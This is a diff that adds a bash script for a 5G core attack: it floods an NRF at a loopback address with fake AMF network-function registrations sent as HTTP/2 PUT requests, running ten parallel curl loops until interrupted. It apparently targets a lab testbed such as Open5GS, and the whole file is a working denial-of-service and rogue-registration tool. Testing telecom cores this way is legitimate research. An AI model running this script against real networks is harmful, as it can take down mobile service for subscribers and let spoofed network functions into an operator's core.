@@ -1,0 +1,59 @@
+#!/bin/bash
+
+echo "Starting NRF registration flood attack using HTTP/2 PUT..."
+
+NRF_IP="127.0.0.10"
+NRF_PORT="7777"
+TARGET_URL="http://${NRF_IP}:${NRF_PORT}/nnrf-nfm/v1/nf-instances"
+NF_TYPE="AMF"
+
+# Array to track child process PIDs
+pids=()
+
+# Handle Ctrl+C for cleanup
+cleanup() {
+	echo -e "\n[+] Caught Ctrl+C — Stopping flood..."
+	for pid in "${pids[@]}"; do
+    	kill "$pid" 2>/dev/null
+	done
+	wait
+	echo "[+] Flood stopped and processes killed."
+	exit 0
+}
+
+trap cleanup SIGINT
+
+# Function to flood NRF with fake NF registrations
+flood_register() {
+	while true; do
+    	# Generate a random NF instance ID to simulate many NFs
+    	nf_id="fake-nf-$(od -vAn -N2 -tu2 < /dev/urandom | tr -d ' ')"
+
+    	curl --http2-prior-knowledge -s -X PUT "${TARGET_URL}/${nf_id}" \
+      	-H "Content-Type: application/json" \
+      	-d "{
+        	\"nfInstanceId\":\"${nf_id}\",
+        	\"nfType\":\"${NF_TYPE}\",
+        	\"nfStatus\":\"REGISTERED\",
+        	\"heartBeatTimer\":60,
+        	\"plmnList\":[{\"mcc\":\"999\",\"mnc\":\"70\"}],
+        	\"ipv4Addresses\":[\"127.0.0.99\"],
+        	\"priority\":1,
+        	\"capacity\":100
+      	}" > /dev/null
+
+    	sleep 0.01
+	done
+}
+
+# Launch multiple flood threads
+for i in {1..10}; do
+	flood_register &
+	pids+=($!)
+done
+
+echo "[+] Started ${#pids[@]} registration flood processes."
+echo "[+] Press Ctrl+C to stop..."
+
+# Keep running until interrupted
+wait
